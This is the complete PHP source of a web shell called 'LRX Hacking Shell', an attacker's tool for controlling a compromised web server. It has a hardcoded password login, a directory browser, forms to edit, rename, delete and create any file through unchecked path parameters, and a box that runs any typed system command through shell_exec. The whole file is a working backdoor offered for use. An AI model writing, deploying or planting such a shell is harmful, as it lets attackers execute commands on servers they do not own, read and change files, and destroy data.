<?php

// LRX Minimal Shell - Advanced Responsive Design with Login (Dark Black and Glow Green)

session_start();

// Login credentials
$username = 'lrx1010';
$password = 'lrx101010lrx';

// Handle login
if (!isset($_SESSION['loggedin'])) {
    if (isset($_POST['password'])) {
        if ($_POST['password'] === $password) {
            $_SESSION['loggedin'] = true;
            $_SESSION['username'] = $_POST['username'];
        } else {
            echo "<p style='color: red;'>Invalid password</p>";
        }
    }

    if (!isset($_SESSION['loggedin'])) {
        echo "<style>
            body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; margin: 0; padding: 20px; }
            input, button { background-color: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; margin: 5px; width: 200px; }
            button:hover { background-color: #0f0; color: #000; }
        </style>";
        echo "<h2>LRX Shell - Login</h2>";
        echo "<form method='POST'>";
        echo "<input type='text' name='username' placeholder='Username'><br>";
        echo "<input type='password' name='password' placeholder='Password'><br>";
        echo "<button type='submit'>Login</button>";
        echo "</form>";
        exit();
    }
}

function lrxHeader() {
    echo "<style>
        body { background-color: #000; color: #0f0; font-family: monospace; margin: 0; padding: 0; }
        h2, p, h3 { margin: 10px; text-shadow: 0 0 5px #0f0; }
        .username { color: red; text-shadow: 0 0 5px red; margin-bottom: 10px; }
        input, textarea, button { background-color: #000; color: #0f0; border: 1px solid #0f0; margin: 5px; padding: 5px; width: calc(100% - 20px); box-sizing: border-box; }
        button:hover { background-color: #0f0; color: #000; }
        .container { padding: 20px; text-align: center; }
        .command-output { background-color: #000; color: #0f0; padding: 10px; white-space: pre-wrap; word-wrap: break-word; margin: 10px auto; max-width: 100%; }
        ul { list-style-type: none; padding: 0; }
        li { margin: 5px 0; }
        a { color: #0f0; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .edit-link { color: #00f; text-shadow: 0 0 5px blue; }
        .rename-link { color: #ff0; text-shadow: 0 0 5px yellow; }
        .delete-link { color: #f00; text-shadow: 0 0 5px red; }
        @media (max-width: 600px) { input, textarea, button { font-size: 16px; } }
    </style>";
    echo "<div class='container'>";
    echo "<h2 style='white-space: pre; text-shadow: 0 0 5px #0f0;'>
        ██╗     ██████╗ ██╗  ██╗
        ██║     ██╔══██╗╚██╗██╔╝
        ██║     ██████╔╝ ╚███╔╝ 
        ██║     ██╔══██╗ ██╔██╗ 
        ███████╗██║  ██║██╔╝ ██╗
        ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
        </h2>";
    echo "<h2>LRX Hacking Shell</h2>";
    echo "<p class='username'>Welcome, " . htmlspecialchars($_SESSION['username']) . "</p>";
    echo "<p>Advanced directory and file management with responsive shell execution.</p>";
    echo "</div>";
}

function listDirectories($path) {
    
    if ($path !== '/') {
        $parent = dirname($path);
        echo "<h3><li><a href='?path=" . urlencode($parent) . "'>>>>>(Parent📁)</a></li></h3>";
    }
    echo "<h3 style='text-decoration: underline;'>Directories:>>📁⬇️</h3><ul>";
    foreach (scandir($path) as $item) {
        if ($item == '.' || $item == '..') continue;
        $fullPath = $path . '/' . $item;
        if (is_dir($fullPath)) {
            echo "<li>-->><a href='?path=" . urlencode($fullPath) . "'>" . htmlspecialchars($item) . "📁</a></li>";
        }
    }
    echo "</ul>";
}

function listFiles($path) {
    echo "<h3 style='text-decoration: underline;'>Files:>>📁⬇️</h3><ul>";
    foreach (scandir($path) as $item) {
        if ($item == '.' || $item == '..' || is_dir($path . '/' . $item)) continue;
        $fullPath = $path . '/' . $item;
        echo "<li>-->>📄" . htmlspecialchars($item) . " ";
        echo "<a class='edit-link' href='?path=" . urlencode($path) . "&edit=" . urlencode($item) . "'>[Edit✏️]</a> ";
        echo "<a class='rename-link' href='?path=" . urlencode($path) . "&rename=" . urlencode($item) . "'>[Rename🔄]</a> ";
        echo "<a class='delete-link' href='?path=" . urlencode($path) . "&delete=" . urlencode($item) . "'>[Delete 🗑️]</a>";
        echo "</li>";
    }
    echo "</ul>";
}

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();

if (isset($_GET['delete'])) {
    unlink($path . '/' . $_GET['delete']);
}

if (isset($_POST['rename']) && isset($_POST['newname'])) {
    rename($path . '/' . $_POST['rename'], $path . '/' . $_POST['newname']);
}

if (isset($_POST['create']) && isset($_POST['filename'])) {
    file_put_contents($path . '/' . $_POST['filename'], '');
}

if (isset($_POST['edit']) && isset($_POST['content'])) {
    file_put_contents($path . '/' . $_POST['edit'], $_POST['content']);
}

$output = '';
if (isset($_POST['command'])) {
    $output = shell_exec($_POST['command']);
}

lrxHeader();

echo "<p>Current Directory: " . htmlspecialchars($path) . "</p>";

listDirectories($path);
listFiles($path);

if (isset($_GET['edit'])) {
    $file = $path . '/' . $_GET['edit'];
    $content = file_get_contents($file);
    echo "<h3>Editing: " . htmlspecialchars($_GET['edit']) . "</h3>";
    echo "<form method='POST'>";
    echo "<textarea name='content' rows='10'>" . htmlspecialchars($content) . "</textarea><br>";
    echo "<input type='hidden' name='edit' value='" . htmlspecialchars($_GET['edit']) . "'>";
    echo "<button type='submit'>Save</button>";
    echo "</form>";
}

if (isset($_GET['rename'])) {
    echo "<h3>Renaming: " . htmlspecialchars($_GET['rename']) . "</h3>";
    echo "<form method='POST'>";
    echo "<input type='text' name='newname' placeholder='New name'>";
    echo "<input type='hidden' name='rename' value='" . htmlspecialchars($_GET['rename']) . "'>";
    echo "<button type='submit'>Rename</button>";
    echo "</form>";
}

echo "<h3>Create New File:</h3>";
echo "<form method='POST'>";
echo "<input type='text' name='filename' placeholder='Filename'><br>";
echo "<button type='submit' name='create'>Create</button>";
echo "</form>";

// Shell Injection Area
echo "<h3>Shell Command Execution:</h3>";
echo "<form method='POST'>";
echo "<input type='text' name='command' placeholder='Enter command'><br>";
echo "<button type='submit'>Execute</button>";
echo "</form>";

echo "<div class='command-output'>" . htmlspecialchars($output ?? "No output or command failed") . "</div>";

?>